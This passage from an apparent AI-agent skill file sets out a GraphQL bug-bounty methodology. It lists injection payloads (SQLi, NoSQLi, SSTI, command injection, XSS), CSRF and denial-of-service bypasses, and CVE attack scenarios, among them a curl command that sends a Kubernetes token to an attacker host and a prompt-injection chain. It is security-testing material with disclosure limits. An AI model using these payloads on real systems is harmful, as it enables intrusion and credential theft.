6. Deactivated/disabled account: keep old session, hit GraphQL
7. Subscription auth: open with valid auth, verify per-event re-auth; revoke session mid-stream
8. Mass-assignment: undocumented input fields (`alias`, `slug`, `vanity_url`, `role`, `permissions`, `is_admin`, `organizationId`, `tenantId`)

**Phase 4 — Apollo Federation testing (if federation detected)**
1. `_service{sdl}` direct on supergraph AND on enumerated subgraph hosts
2. `_entities(representations:[...])` direct invocation on supergraph and subgraphs
3. Test every directive bypass (transitive, interface, renamed, polymorphic)
4. Operation-limit overflow (CVE-2025-32033) probe
5. Prototype pollution via aliases (CVE-2026-32621)

**Phase 5 — Injection sweep**
1. Every String/ID arg: SQLi (`x' OR 1=1--`), NoSQLi (`{$ne:null}`), SSTI (`{{7*7}}`), cmd injection (`;id;`), SSRF (Collaborator), XSS (`<svg onload=...>`)
2. Custom scalars: JSON / DateTime / URL / UUID / EmailAddress / BigInt — each gets its bypass set
3. Multipart upload: path traversal, `map`-field prototype pollution, polyglot files
4. WebSocket: send same injection payloads over WS — different auth middleware

**Phase 6 — DoS / rate-limit / cost bypass**
1. Alias batching for MFA/OTP/login brute (only if paid-resource burn possible per post-Oct 2025 policy)
2. graphql-armor cost-limit `__schema`-named bypass
3. Named-fragment recursion (CVE-2025-32032)
4. `@defer`/`@stream` amplification
5. Directive overload
6. Hot Chocolate parser StackOverflow (CVE-2026-40324) if .NET
7. Subscription unbounded flood (CVE-2026-35526) if Strawberry

**Phase 7 — CSRF / XS-Search**
1. `application/x-www-form-urlencoded` body
2. `text/plain` raw JSON
3. `multipart/form-data` w/ `operations` field
4. `message/http` Content-Type (Apollo Server <5.5.0)
5. GET-method mutation
6. CSWSH on `/graphql-ws`

**Phase 8 — Chain & validate**
1. Reproduce 3× per `12-evidence-discipline.md`
2. Tag account used in every PoC
3. Verbatim curl + response in report
4. No "could potentially" — show the proof
5. Chain to ATO/RCE/cross-tenant for highest bounty bracket

---

## Real Impact Scenarios (canonical chains)

### Scenario A: Apollo Federation — `_service{sdl}` + `_entities` cross-subgraph PII exfil
Target's supergraph at `/graphql` has introspection disabled. Probe `{_service{sdl}}` returns full SDL because federation auto-installs the field. SDL reveals subgraph entity keys for `User`, `PaymentMethod`, `Account`. `_entities(representations:[{__typename:"PaymentMethod",id:guess}])` queried directly against the supergraph triggers gateway-side `_entities` fetch to Billing subgraph with no original-client auth context. Returns `cardNumberLast4`, `tokenizedFullPan` for any guessed PM ID. Hunt cue: any Apollo target with federation enabled.

### Scenario B: Chaos Mesh GraphQL mutation → K8s cluster takeover (CVE-2025-59359/60/61)
Pre-auth GraphQL on `chaos-mesh-controller-manager:10082/query`. Mutation `cleanTcs(input:{device:"eth0; cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl atk -d@-"})` concatenates arg into shell. Chaos Daemon SA token returned to attacker. Token has cluster-wide pod-manipulation rights → steal every pod's SA token → cluster admin. CVSS 9.8 × 3. Hunt cue: any K8s-adjacent GraphQL with mutation args naming devices/processes/paths/hosts.

### Scenario C: HackerOne $25k — bug-bounty platform object-ID enumeration (Cyberw1ng Feb 2025)
GraphQL `program(id:)` resolver missing access control. Sequential ID enum reveals all private programs, scope, private report titles, NDA-protected intel. Single primitive, $25k bounty — severity is data class, not technique novelty.

### Scenario D: Facebook Page admin email — $15k single-query disclosure (Mar 2025)
One unguarded nested field on a Page object returns admin email to any logged-in user. No introspection bypass, no chain. Confirms 2025 trend: high-payout GraphQL bugs are still mostly about missing field-level auth on nested objects.

### Scenario E: WebSocket subprotocol IDOR → error-based PostgreSQL SQLi → PII (Apr 2026 $2k)
`/graphql-ws` had no authz on document fetches; doc IDs were 25-digit random numerics defeating enumeration. Researcher mangled ID with random alphanumerics → verbose PostgreSQL errors revealing schema → used `||` string-concat for error-based extraction → exfil full doc IDs from other rows → re-used IDOR with stolen IDs to read legal docs. Two firsts: WS subprotocol as IDOR/SQLi surface; explicit "high entropy is not authorization."

### Scenario F: HackerOne $12.5k SMS-burn DoS (Apr 2026, H1 #3287208)
`verifyAccountRecoveryPhoneNumber` mutation aliased 1000× in one HTTP request → 1000 SMS sends from one rate-limited request → SMS API budget exhausted. Last clean bounty under pre-Oct 2025 policy. Generalize: every mutation triggering metered external action (Twilio, SendGrid, Stripe, OpenAI tokens, AWS Lambda invocations) is a candidate.

### Scenario G: Magento SessionReaper (CVE-2025-54236) → unauth RCE via GraphQL
Nested deserialization in `ServiceInputProcessor` reachable through REST/GraphQL/SOAP. PHP sessions stored as files → instant RCE on shopkeepers who use file-session-storage. 250+ stores compromised overnight in Oct 2025. KEV-listed. Pattern: when REST gets patched, attackers find equivalent GraphQL multiplexer often still vulnerable.

### Scenario H: api-platform Relay node bypass (CVE-2025-31481, Mar 2025)
Every Symfony/PHP shop running api-platform's GraphQL module shipped default-on `node(id:)` that bypasses `security: "is_granted('ROLE_USER')"` on every type. One-query PoC: `{node(id:"/users/1"){...on User{email passwordHash}}}`. Affects 4.0.0–4.0.21 and 3.4.0–3.4.16. Hunt cue: Symfony + api-platform + GraphQL module.

### Scenario I: graphql-ruby `from_introspection` supply-chain RCE (CVE-2025-27407)
Any Rails app importing a schema from external GraphQL source (federated gateways, schema-doc generators, IDE plugins, MCP servers) executes attacker-controlled Ruby. Stand up hostile GraphQL server → victim pipeline fetches schema → RCE on Rails box. CVSS 9.0.

### Scenario J: Apollo Sandbox postMessage CSRF (CVE-2025-59845)
Any embedded `<iframe src="apollo-sandbox">` accepts `window.postMessage` from any origin. Attacker page drives queries/mutations from attacker-controlled embedder. 5-minute test on every `/apollo`, `/sandbox`, `/explorer`.

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   - Concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources, execute code, exfil cloud creds
   - "The schema is visible" alone is NOT enough — what does the schema unlock?

2. **What does the victim LOSE?**
   - Data confidentiality (PII, financial, NDA-class)
   - Access-control integrity
   - For RC pattern: an org admin loses guarantee that removing a team revokes access
   - For cross-tenant: another customer's data is reachable
   - For RCE chain: server takeover

3. **Can it be reproduced in 10 minutes from scratch?**
   - Exact curl sequence; run twice
   - Privilege persists deterministically (not flaky timing)
   - For RC/desync: document the window precisely

**Critical-Hold tripwires** (per `18-responsible-disclosure.md`):
- Never enumerate beyond minimum proof — single victim row, not the entire DB
- For cross-tenant: prove with one other-tenant fetch, stop
- Never call destructive mutations (deleteUser, deleteProject) against real data
- For GraphQL → cloud creds: read-only validation only (`sts:GetCallerIdentity`)

---

## Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global Relay IDs are IDOR factories. Chain primitive: introspection → `node()` IDOR → cross-tenant data via base64-decoded type:id replay
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets; clients send full input, server merges. Chain primitive: mutation + extra fields → role escalation
- **`hunt-business-logic`** — GraphQL aliases let you call same mutation N times defeating per-request limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single round-trip
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet, ideal single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend
- **`hunt-ssrf`** — GraphQL URL-accepting mutations are SSRF candidates (EXNESS, Craft CMS, OAuth dynamic client). Chain primitive: GraphQL `fetchUrl` + IMDS → AWS creds
- **`hunt-metadata-ssrf`** — Apollo Router with Rhai/JS scripting is a researcher-grade SSRF surface
- **`hunt-rce`** — GraphQL → Spring Actuator → SpEL RCE, GraphQL → ZMQ pickle → AI cluster, Chaos Mesh GraphQL → K8s takeover
- **`hunt-deserialization`** — Magento SessionReaper, graphql-ruby `from_introspection`, BentoML pickle via GraphQL upload
- **`hunt-oauth`** — OAuth dynamic client registration via GraphQL (logo_uri/jwks_uri/redirect_uris) → SSRF
- **`hunt-jwt`** — GraphQL sessions sometimes use different JWT validation than REST (alg=none on GraphQL handler)
- **`hunt-websocket`** — graphql-ws / graphql-transport-ws subprotocols; CSWSH on subscription endpoints
- **`hunt-csrf`** — GraphQL Content-Type bypass matrix above
- **`hunt-file-upload`** — GraphQL multipart spec (operations/map/0): path traversal, prototype pollution, polyglot
- **`hunt-llm-ai`** — Apollo MCP Server exposes GraphQL as LLM tool-calls; prompt-injection → GraphQL mutation chain
- **`hunt-second-order`** — Stored GraphQL mutations triggered later by async workers
- **`security-arsenal`** — GraphQL Payload Pack: introspection, schema-suggestion probe, alias amplification, depth bomb, batch attack, federation `_entities`
- **`triage-validation`** — Body-Diff Rule: introspection alone is informational; require concrete cross-tenant read or mutation-with-impact PoC

---

## Fallback Chain (when stuck)

1. Standard introspection blocked → try `{_service{sdl}}` (federation auto-field)
2. Still blocked → targeted `__type(name:)` queries
3. Still blocked → WebSocket subprotocol introspection (`graphql-transport-ws`)
4. Still blocked → field-suggestion brute-force (Clairvoyance / InQL v6.1.0)
5. Still blocked → APQ register-on-first-use to bypass query-body WAF
6. Still blocked → operation-name prefix bypass (`__schemaFakeName`)
7. Still blocked → alt paths (`/internal`, `/staff`, `/v2`)
8. Schema known → test Relay `node(id:)` against EVERY type (api-platform CVE-2025-31481)
9. Test `_entities` direct invocation if federation
10. Test every mutation with low-priv token (BFLA)
11. Test every mutation with `read_api`-style scoped token (scope confusion CVE-2025-11340)
12. Test every URL/template/filter/raw-SQL arg for injection
13. Test custom scalars with their bypass set (JSON / DateTime / URL / UUID / Email / BigInt)
14. Test CSRF: `text/plain`, `multipart/form-data`, `message/http`, GET-method
15. Test CSWSH on subscription endpoints (Origin not validated)
16. Test mass-assignment with undocumented input fields
17. Test alias batching for MFA/OTP/login brute (only if paid-resource burn)
18. Test named-fragment recursion DoS (CVE-2025-32032)
19. Test graphql-armor `__schema`-named bypass
20. Test prototype pollution via alias/variable names (`__proto__`, `constructor`, `prototype`)
21. Never report DNS-only/info-only — escalate to meaningful impact
22. GraphQL with impact: minimum $2.5k; cross-tenant = $5k+; cloud creds = $10k+; cross-account = $25k+; pre-auth RCE = $15k+ (private)

**Never stop. Always have a next action.**
